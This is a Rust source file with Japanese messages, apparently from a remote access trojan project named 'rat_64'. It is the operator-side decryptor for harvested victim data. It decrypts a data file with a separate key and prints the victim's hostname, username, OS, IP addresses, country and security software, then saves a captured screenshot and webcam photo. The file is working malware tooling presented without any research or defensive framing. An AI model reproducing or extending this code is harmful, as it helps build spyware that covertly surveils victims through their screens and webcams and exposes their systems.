use std::env;
use rat_64::decrypt::{decrypt_data_file, save_screenshot, save_webcam_image};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        eprintln!("使用法: {} <data.dat> [key.bin]", args[0]);
        eprintln!("例:");
        eprintln!("  {} data.dat              # key.binを自動検索", args[0]);
        eprintln!("  {} data.dat my_key.bin   # 指定されたキーファイルを使用", args[0]);
        return Ok(());
    }

    let data_file = &args[1];
    let key_file = args.get(2).map(|s| s.as_str());

    println!("復号化中: {}", data_file);
    if let Some(key) = key_file {
        println!("キーファイル: {}", key);
    }

    // データを復号化
    match decrypt_data_file(data_file, key_file) {
        Ok((system_info, image_data)) => {
            println!("\n=== システム情報 ===");
            println!("ホスト名: {}", system_info.hostname);
            println!("OS: {} {}", system_info.os_name, system_info.os_version);
            println!("ユーザー名: {}", system_info.username);
            println!("プロセッサ: {}", system_info.processor);
            println!("CPUコア数: {}", system_info.cores);
            println!("ローカルIP: {}", system_info.local_ip);
            println!("グローバルIP: {}", system_info.global_ip);
            println!("国コード: {}", system_info.country_code);
            
            if !system_info.security_software.is_empty() {
                println!("セキュリティソフト: {:?}", system_info.security_software);
            }

            // 画像保存
            if !image_data.screenshot.is_empty() {
                match save_screenshot(&image_data.screenshot, "screenshot.png") {
                    Ok(_) => println!("\nスクリーンショットを保存: screenshot.png"),
                    Err(e) => eprintln!("スクリーンショット保存エラー: {}", e),
                }
            } else {
                println!("\nスクリーンショット: なし");
            }

            if !image_data.webcam_image.is_empty() {
                match save_webcam_image(&image_data.webcam_image, "webcam.png") {
                    Ok(_) => println!("Webカメラ画像を保存: webcam.png"),
                    Err(e) => eprintln!("Webカメラ画像保存エラー: {}", e),
                }
            } else {
                println!("Webカメラ画像: なし");
            }
        }
        Err(e) => {
            eprintln!("復号化エラー: {}", e);
            eprintln!("\n新形式専用の復号化ツールです。以下を確認してください:");
            eprintln!("- data.datファイルが新形式（キー分離型）で作成されているか");
            eprintln!("- key.binファイルが同じディレクトリに存在するか");
            eprintln!("- キーファイルとデータファイルが対応しているか");
            eprintln!("- ファイルが破損していないか");
            eprintln!("\n注意: 旧形式（キー埋め込み型）のファイルはサポートされません。");
        }
    }

    Ok(())
}